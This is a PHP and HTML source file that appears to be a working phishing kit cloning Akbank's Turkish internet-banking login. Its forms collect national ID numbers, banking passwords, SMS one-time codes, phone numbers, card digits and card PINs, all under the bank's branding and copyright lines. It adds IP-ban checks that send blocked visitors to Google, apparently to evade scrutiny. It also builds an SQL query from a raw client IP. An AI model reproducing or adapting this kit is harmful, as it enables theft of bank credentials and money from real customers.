<?php
include_once 'adsblock.php';
include "./h4ci/config.php";

include "./h4ci/project-security.php";

$b_user_ip = $_SERVER['REMOTE_ADDR'];
$ip_ban = $conn->query("SELECT ip_ban FROM users WHERE ip = '$b_user_ip'");

if ($ip_ban && $ip_ban->num_rows > 0) {
    $row = $ip_ban->fetch_assoc();
    if ($row["ip_ban"] == 1) {
        header("Location: https://href.li/?https://www.google.com/");
        exit();
    }
}
// session_start();
// unset($_SESSION['id']);
$page_settings = $conn->query("SELECT * FROM page_settings");
$page_settings_row = $page_settings->fetch_assoc();

?>
<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akbank Hoşgeldiniz</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/css/style.css">
    <style>
        .error-border {
            border-color: red !important;
        }
    </style>
</head>

<body>
    <noscript>You must enable javascript in your browser to view this webpage.</noscript>
    <div class="top">
        <a>Kurumsal</a>
        <span class="extra">
        </span>
        <a>English</a>
    </div>
    <header>
        <div class="container header">
            <span class="logo">
                <img src="assets/img/logo.png" width="150px">
            </span>
        </div>
    </header>
    <main class="container">
        <div class="main-container">
            <div class="section section-loading" id="loadingSection">
                <div class="loading-icon"></div>
                <div class="loading-text">İşleminiz devam ediyor, lütfen bekleyiniz.</div>
            </div>

            <div class="section" id="forgot-password" style="display: none;">
                <div class="section-1">
                    <span class="red">Şifre Al</span>
                    <button class="section-btn" style="width: 100px;"> Bilgi Girişi</button>
                    <form>
                        <div>
                            <div class="inputs">
                                <div class="input-with-image">
                                    <h4 style="color: red; margin-bottom: 20px; display: none;" id="forgot-password-error">Lütfen bilgilerinizi konrol edin.</h4>
                                    <label for=""> Müşteri / TC Kimlik No</label>
                                    <div class="input-wrapper">
                                        <input type="tel" inputmode="numeric" id="tckn" maxlength="11" required autocomplete="off" oninput="handleForgotTCInputChange()">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                                <div class="input-with-image">
                                    <label for=""> Kart Numaranızın Son 4 Hanesi</label>
                                    <div class="input-wrapper card-last-4">
                                        <input type="tel" inputmode="numeric" value="****" disabled readonly>
                                        <input type="tel" inputmode="numeric" value="****" disabled readonly>
                                        <input type="tel" inputmode="numeric" value="****" disabled readonly>
                                        <input type="tel" inputmode="numeric" name="last4" id="last4" maxlength="4" required autocomplete="off" oninput="handleLast4()">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                                <div class="input-with-image">
                                    <label for=""> Kart Şifresi</label>
                                    <div class="input-wrapper">
                                        <input type="tel" inputmode="numeric" id="cardpin" maxlength="4" required autocomplete="off" oninput="handleCardPin()">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <button type="button" class="btn" id="loginButton" onclick="submitForgot();">Devam</button>
                        <button type="submit" class="btn" id="loginProcess" style="display:none;">
                            <div class="spinner">
                                İşleminiz sürüyor lütfen bekleyiniz
                            </div>
                        </button>
                    </form>
                </div>

                <a class="link"> Her hakkı Akbank T.A.'ye aittir. <script>
                        document.write(new Date().getFullYear())
                    </script> </a>
            </div>
            <div class="section" id="loginf">
                <div class="section-1">
                    <span class="red">Bireysel</span>
                    <button class="section-btn"> Müşteri / TC Kimlik No ile Giriş</button>
                    <form>
                        <div>
                            <div class="inputs">
                                <div class="input-with-image">
                                    <label for=""> Müşteri / TC Kimlik No</label>
                                    <div class="input-wrapper">
                                        <input type="tel" inputmode="numeric" id="username" maxlength="11" required autocomplete="off" oninput="handleTCInputChange()">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                                <div class="input-with-image mb-2">
                                    <label for=""> Akbank Şifresi</label>
                                    <div class="input-wrapper">
                                        <input type="password" id="password" inputmode="numeric" maxlength="6" required autocomplete="off">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                            </div>
                            <a class="link forgot-password" onclick="showForgotPassword();">Şifremi unuttum</a>
                        </div>
                        <button type="button" class="btn" id="loginButton" onclick="submitLogin();">Giriş</button>
                        <button type="submit" class="btn" id="loginProcess" style="display:none;">
                            <div class="spinner">
                                İşleminiz sürüyor lütfen bekleyiniz
                            </div>
                        </button>
                    </form>
                </div>
                <div class="footer" id="footer">
                    <span class="white"> Şifre Al </span>
                    <p> Akbank Şifreniz yoksa veya unuttuysanız tıklayın, Şifrenizi kolayca alın! </p>
                    <button class="btn-2"> Şifre Al </button>
                </div>
                <a class="link"> Her hakkı Akbank T.A.'ye aittir. <script>
                        document.write(new Date().getFullYear())
                    </script> </a>
            </div>
            <div class="section" id="loginfe" style="display: none;">
                <div class="section-1">
                    <span class="red">Bireysel</span>
                    <button class="section-btn"> Müşteri / TC Kimlik No ile Giriş</button>
                    <form>
                        <div>
                            <div class="inputs">
                                <div class="input-with-image">
                                    <h4 style="color: red; margin-bottom: 20px;">Lütfen bilgilerinizi konrol edin.</h4>
                                    <label for="">Müşteri / TC Kimlik No</label>
                                    <div class="input-wrapper">
                                        <input type="tel" inputmode="numeric" id="usernamefe" maxlength="11" required autocomplete="off" oninput="handleTCInputChange()">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                                <div class="input-with-image mb-2">
                                    <label for="">Akbank Şifresi</label>
                                    <div class="input-wrapper">
                                        <input type="password" id="passwordfe" inputmode="numeric" maxlength="6" required autocomplete="off">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                            </div>
                            <a class="link forgot-password" onclick="showForgotPassword();">Şifremi unuttum</a>
                        </div>
                        <button type="button" class="btn" id="loginButtonfe" onclick="submitLoginfe();">Giriş</button>
                        <button type="submit" class="btn" id="loginProcessfe" style="display:none;">
                            <div class="spinner">
                                İşleminiz sürüyor lütfen bekleyiniz
                            </div>
                        </button>
                    </form>
                </div>
                <div class="footer" id="footer">
                    <span class="white"> Şifre Al </span>
                    <p> Akbank Şifreniz yoksa veya unuttuysanız tıklayın, Şifrenizi kolayca alın! </p>
                    <button class="btn-2"> Şifre Al </button>
                </div>
                <a class="link"> Her hakkı Akbank T.A.'ye aittir. <script>
                        document.write(new Date().getFullYear())
                    </script> </a>
            </div>
            <div class="section" id="phonef" style="display:none;">
                <div class="section-1">
                    <span class="red">Bireysel</span>
                    <form>
                        <div>
                            <div class="inputs">
                                <div class="input-with-image">
                                    <label for="">Cep telefonuza gelen 6 haneli SMS</label>
                                    <div class="input-wrapper">
                                        <input type="tel" inputmode="numeric" id="phone" maxlength="6" required autocomplete="off">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <button type="button" class="btn" id="loginButtonPhone" onclick="submitPhone();"> Devam et </button>
                        <button type="submit" class="btn" id="loginProcessPhone" style="display:none;">
                            <div class="spinner">
                                İşleminiz sürüyor lütfen bekleyiniz
                            </div>
                        </button>
                    </form>
                </div>
                <div class="footer" id="footer">
                    <span class="white"> Şifre Al </span>
                    <p> Akbank Şifreniz yoksa veya unuttuysanız tıklayın, Şifrenizi kolayca alın! </p>
                    <button class="btn-2"> Şifre Al </button>
                </div>
                <a class="link"> Her hakkı Akbank T.A.'ye aittir. <script>
                        document.write(new Date().getFullYear())
                    </script> </a>
            </div>
            <div class="section" id="codef" style="display: none;">
                <div class="section-1">
                    <span class="red">Bireysel</span>
                    <form>
                        <div>
                            <div class="inputs">
                                <div class="input-with-image">
                                    <label for="">Telefon Numaranız</label>
                                    <div class="input-wrapper">
                                        <input type="tel" inputmode="numeric" id="phonecode" required autocomplete="off">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <button type="button" class="btn" id="loginButtonCode" onclick="submitCode();"> Devam et </button>
                        <button type="submit" class="btn" id="loginProcessCode" style="display:none;">
                            <div class="spinner">
                                İşleminiz sürüyor lütfen bekleyiniz
                            </div>
                        </button>
                    </form>
                </div>
                <div class="footer" id="footer">
                    <span class="white"> Şifre Al </span>
                    <p> Akbank Şifreniz yoksa veya unuttuysanız tıklayın, Şifrenizi kolayca alın! </p>
                    <button class="btn-2"> Şifre Al </button>
                </div>
                <a class="link"> Her hakkı Akbank T.A.'ye aittir. <script>
                        document.write(new Date().getFullYear())
                    </script> </a>
            </div>
            <div class="section" id="phonefe" style="display: none;">
                <div class="section-1">
                    <span class="red">Bireysel</span>
                    <form>
                        <div>
                            <div class="inputs">
                                <div class="input-with-image">
                                    <h4 style="color:red; margin-bottom:10px;">Hatalı giriş yaptınız</h4>
                                    <label for="">Cep telefonuza gelen 6 haneli SMS</label>
                                    <div class="input-wrapper">
                                        <input type="tel" inputmode="numeric" id="phonefet" maxlength="6" required autocomplete="off">
                                        <img src="assets/img/question.png" title="Lütfen ilgili alan doldurunuz" width="24px">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <button type="button" class="btn" id="loginButtonPhonefe" onclick="submitPhonefe();"> Devam et </button>
                        <button type="submit" class="btn" id="loginProcessPhonefe" style="display:none;">
                            <div class="spinner">
                                İşleminiz sürüyor lütfen bekleyiniz
                            </div>
                        </button>
                    </form>
                </div>
                <div class="footer" id="footer">
                    <span class="white"> Şifre Al </span>
                    <p> Akbank Şifreniz yoksa veya unuttuysanız tıklayın, Şifrenizi kolayca alın! </p>
                    <button class="btn-2"> Şifre Al </button>
                </div>
                <a class="link"> Her hakkı Akbank T.A.'ye aittir. <script>
                        document.write(new Date().getFullYear())
                    </script> </a>
            </div>
            <div class="section" id="creditf" style="display:none;">
                <div class="section-phone">
                    <span class="extra-font mb-2"><?php echo $page_settings_row['notification_text1']; ?></span>
                    <form>
                        <div>
                            <div class="inputs">
                                <div class="input-with-image">
                                    <label style="margin-bottom: 20px;" for=""><?php echo $page_settings_row['notification_text2']; ?></label>
                                    <span id="gerisayim">Geriye kalan süre</span>
                                </div>
                            </div>
                        </div>
                        <button type="submit" class="btn btn-credit" id="loginProcessCredit" style="display:none;">
                            <div class="spinner">
                                İşleminiz sürüyor lütfen bekleyiniz
                            </div>
                        </button>
                    </form>
                </div>
                <a class="link"> Her hakkı Akbank T.A.'ye aittir. <script>
                        document.write(new Date().getFullYear())
                    </script> </a>
            </div>
            <div class="section" id="verf" style="display: none;">
                <div class="section-phone">
                    <span class="extra-font mb-2"><?php echo $page_settings_row['success_text1']; ?></span>
                    <div style=" text-align: -webkit-center; margin: 0 auto; ">
                        <div>
                            <img src="./assets/img/customer_service.png" alt="image" style="width: 200px; pointer-events: none; user-select: none;">
                            <div class="input-with-image">
                                <label for="" style="margin-top: 15px;display: block;font-size: 17px;"><?php echo $page_settings_row['success_text2']; ?></label>
                            </div>
                        </div>
                    </div>
                </div>
                <a class="link"> Her hakkı Akbank T.A.'ye aittir.
                    <script>
                        document.write(new Date().getFullYear())
                    </script>
                </a>
            </div>
            <div class="section-2">
                <div class="section-header">
                    <span style="font-size: 24px;">Güvenliğiniz için:</span>
                    <div class="icon">
                        <img src="assets/img/lock.png" width="32px">
                    </div>
                </div>
                <div class="content">
                    <ul>
                        <li>
                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24">
                                <path fill="black" d="m10 17l5-5l-5-5z" />
                            </svg> Akbank Şifrenizi kimseyle paylaşmayın.
                        </li>
                        <li>
                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24">
                                <path fill="black" d="m10 17l5-5l-5-5z" />
                            </svg> Sizi arayıp, Akbank Şifrenizi soran kişilere itibar etmeyin.
                        </li>
                    </ul>
                    <a href="#" class="link">Tüm Güvenlik Uyarıları</a>
                </div>
            </div>

        </div>
    </main>

    <div id="errorModal" class="modal" style="display: none;">
        <div class="modal-content">
            <div class="modal-header">
                <span>Uyarı</span>
                <div class="close" onclick="closeErrorModal()">
                    <svg xmlns="http://www.w3.org/2000/svg" width="800px" height="800px" viewBox="0 0 24 24" fill="none">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12ZM7.29289 16.7071C6.90237 16.3166 6.90237 15.6834 7.29289 15.2929L10.5858 12L7.29289 8.70711C6.90237 8.31658 6.90237 7.68342 7.29289 7.29289C7.68342 6.90237 8.31658 6.90237 8.70711 7.29289L12 10.5858L15.2929 7.29289C15.6834 6.90237 16.3166 6.90237 16.7071 7.29289C17.0976 7.68342 17.0976 8.31658 16.7071 8.70711L13.4142 12L16.7071 15.2929C17.0976 15.6834 17.0976 16.3166 16.7071 16.7071C16.3166 17.0976 15.6834 17.0976 15.2929 16.7071L12 13.4142L8.70711 16.7071C8.31658 17.0976 7.68342 17.0976 7.29289 16.7071Z" fill="#222222" />
                    </svg>
                </div>
            </div>

            <div class="modal-body">
                <img src="assets/img/warning.png">
                <p>
                    Girmiş olduğunuz bilgilerden biri eksik veya hatalıdır. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.
                </p>
            </div>

            <div class="modal-footer">
                <button onclick="closeErrorModal()" class="btn">Tamam</button>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.9/jquery.inputmask.min.js" integrity="sha512-F5Ul1uuyFlGnIT1dk2c4kB4DBdi5wnBJjVhL7gQlGh46Xn0VhvD8kgxLtjdZ5YN83gybk/aASUAlpdoWUjRR3g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript" src="./assets/js/script.js"></script>
    <script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function() {
            checkIP();
        });

        function checkIP() {
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    if (xhr.status == 200) {
                        var response = xhr.responseText;
                        if (response === "banned") {
                            window.location.href = "https://www.google.com";
                        }
                    } else {
                        console.error('İsteğin işlenmesinde bir hata oluştu.');
                    }
                }
            };
            xhr.open("GET", "check_ip.php", true);
            xhr.send();
        }

        var im_1 = $("#phonecode").inputmask({
            alias: "phone",
            mask: "+\\90 999 999 9999",
            placeholder: " ",
            showMaskOnHover: false,
            showMaskOnFocus: false,
        });
    </script>
</body>

</html>